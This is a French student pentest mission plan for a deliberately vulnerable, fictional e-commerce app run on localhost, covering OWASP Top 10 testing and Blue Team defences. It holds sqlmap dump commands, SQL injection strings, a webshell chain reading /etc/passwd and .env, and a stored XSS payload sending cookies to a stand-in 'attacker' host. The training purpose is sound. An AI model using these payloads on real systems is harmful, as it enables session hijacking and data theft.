# Plan d'Attaque – Mission Audit SecureShop
**Type de document :** Statement of Work (SOW) – Usage interne  
**Groupe :** [Nom du groupe]  
**Client fictif :** SecureShop SAS  
**Commanditaire :** RSSI / Direction Technique  
**Consultant(s) :** [Noms des membres du groupe]  
**Date de mission :** 13 – 17 avril 2026 (5 jours)  
**Budget simulé :** 15 000 € (3 000 €/jour)  
**Cadre légal :** Mission réalisée dans un environnement isolé et fictif – données simulées

---

## 1. Executive Summary

Ce document constitue le plan de mission pour l'audit de sécurité de l'application web e-commerce **SecureShop**, intentionnellement vulnérable, dans le cadre d'un exercice Red Team / Blue Team.

La mission se déroule en deux grandes phases : une **phase offensive** (Red Team) visant à identifier et exploiter les vulnérabilités de l'application selon le référentiel OWASP Top 10, suivie d'une **phase défensive** (Blue Team) visant à déployer des contre-mesures adaptées (WAF, IDS, SIEM) et à valider leur efficacité par du threat hunting.

La méthodologie appliquée s'appuie sur le **PTES (Penetration Testing Execution Standard)** et le **guide de test OWASP**. Les livrables finaux incluent un rapport technique détaillé, un rapport exécutif d'une page et une présentation de démonstration.

---

## 2. Scope et Périmètre

### 2.1 Assets Analysés

| Asset | Description | URL / Accès |
|-------|-------------|-------------|
| Application web SecureShop | Application e-commerce vulnérable (Docker) | `http://localhost:8080` |
| API REST SecureShop | Endpoints d'authentification, panier, paiement | `http://localhost:8080/api/` |
| Base de données | MySQL/PostgreSQL embarquée dans Docker | Via SQLi / accès conteneur |
| Interface d'administration | Panneau admin intentionnellement exposé | `http://localhost:8080/admin/` |

### 2.2 IN SCOPE – Tests Autorisés

- Tests de toutes les fonctionnalités accessibles via navigateur (authentification, recherche, panier, commande, profil utilisateur, administration)
- Injection SQL (manuelle et automatisée avec SQLMap)
- Cross-Site Scripting (XSS reflected, stored, DOM-based)
- Cross-Site Request Forgery (CSRF)
- Broken Access Control / IDOR (accès aux données d'autres utilisateurs)
- Upload de fichiers malveillants (webshells, MIME type bypass)
- Broken Authentication (brute force, session fixation, token faible)
- Security Misconfiguration (headers HTTP, erreurs verboseuses, répertoires exposés)
- Injection de commandes (si présent)
- Analyse des logs et déploiement de contre-mesures Blue Team

### 2.3 OUT OF SCOPE – Lignes Rouges

- ❌ Attaques en dehors de la VM (aucun accès réseau externe)
- ❌ Déni de Service (DoS / DDoS) – interdit même en local
- ❌ Modification des données persistantes sans snapshot préalable
- ❌ Accès à des systèmes autres que SecureShop
- ❌ Tests sur des vrais systèmes ou données personnelles réelles

### 2.4 Hypothèses et Contraintes

- Environnement entièrement local (Host-Only), aucun accès Internet pendant les tests
- Durée fixe : 5 jours × 7h = 35 heures de travail effectif
- Outils disponibles : Burp Suite Community, SQLMap, Nikto, ELK Stack (open-source)
- Snapshots obligatoires avant chaque phase destructive

---

## 3. Méthodologie Détaillée par Phase

### Phase 0 – Reconnaissance Initiale (J1 – 2h)

**Objectifs :**
- Cartographier l'application (pages, formulaires, endpoints)
- Identifier les technologies utilisées (stack technique, framework, version)
- Détecter les premières surfaces d'attaque sans interaction invasive

**Outils :**
- `whatweb`, `gobuster` (énumération de répertoires)
- `nikto` (scan baseline)
- Analyse manuelle avec Firefox + Burp Suite en mode passif
- `curl` pour inspecter headers HTTP et robots.txt

**Commandes clés :**
```bash
whatweb http://localhost:8080
gobuster dir -u http://localhost:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt
nikto -h http://localhost:8080 -output evidence/nikto_baseline.html -Format htm
curl -I http://localhost:8080
curl http://localhost:8080/robots.txt
```

**Critères de succès :**
- Cartographie complète : liste de toutes les routes et formulaires
- Stack technique identifiée (ex : PHP 8.x, MySQL 5.7, Apache 2.4)
- Minimum 3 pistes d'attaque documentées

**Temps estimé :** 2h  
**Risques :** Nikto déclenche des logs → capture PCAP préalable pour analyse Blue Team ultérieure

---

### Phase 1 – Audit Offensif OWASP Top 10 (J2 – 6h)

**Objectifs :**
- Tester systématiquement les 10 catégories OWASP
- Identifier et documenter au minimum 5 vulnérabilités exploitables avec PoC
- Capturer les preuves (screenshots, requêtes Burp, logs)

**Outils :** Burp Suite (Repeater, Intruder), SQLMap, scripts Python custom, Hydra

#### A01 – Broken Access Control / IDOR
```bash
# Test IDOR : accéder aux données d'un autre utilisateur
curl http://localhost:8080/api/orders/1    # Commande de l'user 1
curl http://localhost:8080/api/orders/2    # Doit retourner 403 si protégé
```

#### A02 – Cryptographic Failures
```bash
# Vérifier si les mots de passe sont hashés (analyse réponse SQL si SQLi)
# Vérifier HTTPS et la qualité du chiffrement
sslscan localhost:8443
```

#### A03 – Injection SQL
```bash
# Test manuel via Burp (modifier le paramètre id)
# ' OR '1'='1 dans un champ de recherche
sqlmap -u "http://localhost:8080/search?q=test" --dbs --batch
sqlmap -u "http://localhost:8080/api/product?id=1" -D secureshop -T users --dump --batch
```

#### A05 – Security Misconfiguration
```bash
# Headers de sécurité manquants ?
curl -I http://localhost:8080 | grep -E "(X-Frame|Content-Security|X-XSS|Strict)"
# Répertoires exposés ?
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/big.txt
```

#### A07 – XSS (Cross-Site Scripting)
```
Payload reflected : <script>alert('XSS')</script> dans champ de recherche
Payload stored    : <script>document.location='http://attacker/steal?c='+document.cookie</script>
                    → dans un commentaire produit ou champ de profil
```

#### A08 – CSRF
```python
# Script Python de PoC CSRF (changement de mot de passe sans token)
import requests
s = requests.Session()
s.post("http://localhost:8080/login", data={"user": "victim", "pass": "pass123"})
# Simuler une requête CSRF sans token valide
s.post("http://localhost:8080/account/change-password", data={"new_pass": "hacked"})
```

**Critères de succès :**
- ≥ 1 SQLi fonctionnelle avec extraction de données (table users)
- ≥ 2 XSS (stored et/ou reflected) avec preuve de session hijacking possible
- ≥ 1 CSRF validé sur une action sensible (changement email/mot de passe)
- ≥ 1 IDOR permettant d'accéder aux données d'un autre utilisateur
- ≥ 1 Security Misconfiguration documentée (headers manquants, répertoire exposé)

**Temps estimé :** 6h  
**Risques :**
- WAF déployé trop tôt bloque les tests → maintenir snapshot "pre-WAF"
- Encodage des payloads nécessaire si filtrage basique en place

---

### Phase 2 – Exploitation Avancée & Chaining (J3 – 5h)

**Objectifs :**
- Combiner des vulnérabilités pour maximiser l'impact (chaining)
- Démontrer un scénario d'attaque réaliste de bout en bout
- Atteindre le panneau d'administration ou exfiltrer des données sensibles

**Scénario cible (exemple) :**
```
1. SQLi → Extraction du hash du compte admin
2. Crack du hash (hashcat / john) → Mot de passe admin en clair
3. Connexion panel admin → Upload webshell via fonctionnalité d'import
4. Webshell → Lecture de fichiers de configuration (/etc/passwd, .env)
5. Pivot potentiel vers la base de données → Dump complet
```

**Outils :** SQLMap, Burp Suite, hashcat, weevely (webshell), curl

```bash
# Crack du hash extrait
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Upload webshell (si file upload vulnérable)
# Renommer test.php en test.php.jpg ou utiliser Content-Type bypass via Burp
```

**Critères de succès :**
- Au moins 1 scénario de chaining complet documenté (minimum 2 vulnérabilités enchaînées)
- Accès au panel admin ou extraction de données utilisateurs démontrée
- Impact métier évalué (données exposées, risque RGPD)

**Temps estimé :** 5h  
**Risques :** Webshell peut rendre l'app instable → snapshot avant chaque test destructif

---

### Phase 3 – Déploiement Défenses Blue Team (J4 – 6h)

**Objectifs :**
- Déployer un WAF (ModSecurity ou équivalent) et valider qu'il bloque les attaques documentées en phase 1
- Configurer des règles Suricata pour détecter les patterns d'attaque
- Ingérer les logs applicatifs dans ELK et créer des alertes
- Effectuer du threat hunting basé sur les IOCs identifiés en phase Red Team

**Outils :** ModSecurity, Suricata, ELK Stack (Elasticsearch + Logstash + Kibana)

```bash
# WAF – tester le blocage SQLi post-déploiement
curl "http://localhost:8080/search?q=' OR '1'='1"   # Doit retourner 403

# Suricata – règle de détection SQLi
echo 'alert http any any -> any 8080 (msg:"SQLi attempt"; content:"OR 1=1"; sid:1000001;)' \
  >> /etc/suricata/rules/local.rules
suricata-update
systemctl restart suricata

# ELK – vérifier les alertes dans Kibana
curl http://localhost:9200/_cat/indices
# Dashboard Kibana : visualiser les tentatives d'injection par heure
```

**Critères de succès :**
- WAF bloque 100 % des payloads testés en phase 1 (SQLi, XSS basiques)
- ≥ 3 règles Suricata opérationnelles avec alertes dans Kibana
- Dashboard Kibana avec visualisation des attaques en temps réel
- Rapport de threat hunting : au moins 3 IOCs identifiés dans les logs

**Temps estimé :** 6h  
**Risques :** WAF trop restrictif peut casser l'application → régler le niveau de sensibilité

---

### Phase 4 – Consolidation et Documentation (J5 – 5h)

**Objectifs :**
- Rédiger le rapport technique complet
- Rédiger le rapport exécutif (1 page, language décideurs)
- Préparer la démonstration (slides + démo live des exploits)
- Effectuer une revue finale et un nettoyage de l'environnement

**Livrables produits :**

| Livrable | Format | Destinataire | Volume estimé |
|----------|--------|-------------|--------------|
| Rapport technique | Markdown / PDF | Équipe technique, RSSI | 15-20 pages |
| Rapport exécutif | Markdown / PDF | COMEX, décideurs | 1-2 pages |
| Slides présentation | PDF / PPTX | Formation / client | 10-15 slides |
| Scripts PoC | Python / Bash | Équipe technique | Commentés |
| Règles YARA/Suricata | .rules | SOC / Blue Team | Fichiers dédiés |

---

## 4. Planning Prévisionnel sur 5 Jours

| Jour | Phase | Activités Principales | Livrables du Jour |
|------|-------|-----------------------|-------------------|
| **J1** | Setup + Recon | Installation VM, déploiement SecureShop + ELK, reconnaissance passive | `choix_projet.md`, `setup_validation.md`, `plan_attaque.md`, `daily_log/jour1.md` |
| **J2** | Audit Red Team | Test OWASP Top 10 complet, documentation vulnérabilités, captures Burp | Rapport vulnérabilités brut, screenshots evidence/, `daily_log/jour2.md` |
| **J3** | Exploitation avancée | Chaining, accès admin, exfiltration, rédaction des PoC | Scripts PoC commentés, scénario d'attaque complet, `daily_log/jour3.md` |
| **J4** | Défense Blue Team | WAF, Suricata, ELK dashboards, threat hunting | Règles Suricata, dashboard Kibana, rapport threat hunting, `daily_log/jour4.md` |
| **J5** | Consolidation | Rapport technique, rapport exécutif, présentation, nettoyage | Rapport technique, rapport exécutif, slides présentation |

---

## 5. Livrables et Formats

### 5.1 Rapport Technique
- **Format :** Markdown (converti en PDF)
- **Volume :** 15 à 20 pages
- **Contenu :** Executive summary, méthodologie, liste des vulnérabilités (CVSS score, preuve, impact, remédiation), contre-mesures déployées, conclusions

**Structure OWASP recommandée pour chaque vulnérabilité :**
```
- Titre : [TYPE] Intitulé (ex : [SQLi] Injection SQL sur /search)
- Sévérité : Critique / Haute / Moyenne / Faible (+ score CVSS)
- Description technique
- Preuve (screenshot, requête Burp, output SQLMap)
- Impact métier (ex : exposition RGPD, fraude, vol de données)
- Recommandation de remédiation
- Référence : CWE-xxx / OWASP A03:2021
```

### 5.2 Rapport Exécutif
- **Format :** Markdown (1-2 pages max)
- **Contenu :** Niveau de risque global, nombre de vulnérabilités par criticité, top 3 des risques métier, recommandations prioritaires, budget remédiation estimé

### 5.3 Présentation
- **Format :** Slides (10-15 slides)
- **Contenu :** Contexte mission, méthodologie, démonstration d'1 exploit clé (live ou vidéo), contre-mesures, roadmap remédiation

### 5.4 Artefacts Techniques
- Scripts Python PoC (CSRF, IDOR tester)
- Règles Suricata custom
- Fichier PCAP de référence (trafic d'attaque)
- Exports Kibana (dashboards, alertes)

---

## 6. Critères de Qualité

| Critère | Standard visé |
|---------|---------------|
| **Reproductibilité** | Chaque test documenté avec commandes exactes + screenshots permettant reproduction complète |
| **Conformité** | Référentiels OWASP Top 10 2021, PTES, CVSS v3.1 pour scoring |
| **Couverture** | Minimum 7/10 catégories OWASP testées et documentées |
| **Niveau technique** | Rapport technique lisible par un développeur senior sans contexte supplémentaire |
| **Clarté exécutive** | Rapport exécutif compréhensible par un DG sans compétences techniques |
| **Traçabilité** | Chaque vulnérabilité tracée avec son CVE / CWE de référence |
| **Honnêteté** | Les échecs et blocages sont documentés au même titre que les succès |

---

## Annexe – Matrice de Risque CVSS Simplifiée

| Sévérité | Score CVSS | Couleur | Délai de remédiation |
|----------|-----------|---------|----------------------|
| Critique | 9.0 – 10.0 | 🔴 Rouge | Immédiat (< 24h) |
| Haute | 7.0 – 8.9 | 🟠 Orange | < 1 semaine |
| Moyenne | 4.0 – 6.9 | 🟡 Jaune | < 1 mois |
| Faible | 0.1 – 3.9 | 🟢 Vert | Prochaine release |

---

*Document rédigé dans le cadre du module M1PPAW – École IT*  
*Ce document est un exercice pédagogique. Les tests sont réalisés dans un environnement isolé sur des cibles fictives.*
